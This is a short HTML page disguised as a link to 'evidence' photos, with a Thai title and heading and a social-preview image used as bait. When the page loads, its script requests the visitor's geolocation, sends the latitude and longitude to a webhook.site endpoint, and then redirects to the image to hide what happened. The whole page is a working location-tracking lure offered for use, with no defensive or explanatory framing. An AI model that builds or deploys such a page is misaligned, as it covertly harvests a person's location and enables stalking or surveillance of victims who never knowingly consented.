<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="ดูรูปภาพหลักฐาน">
    <meta property="og:image" content="evidence.jpg"> 
    <meta property="og:type" content="website">
    <title>Loading...</title>
</head>
<body onload="getLocation()" style="background:#000; color:#fff; text-align:center; padding-top:50px;">
    <h2>กำลังโหลดรูปภาพ...</h2>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(s => {
                    // ส่งพิกัดไปที่ระบบหลังบ้าน (Webhook)
                    fetch(`https://webhook.site/YOUR-UNIQUE-ID?lat=${s.coords.latitude}&lng=${s.coords.longitude}`);
                    setTimeout(go, 500);
                }, go);
            } else { go(); }
        }
        function go() { window.location.href = "evidence.jpg"; }
    </script>
</body>
</html>
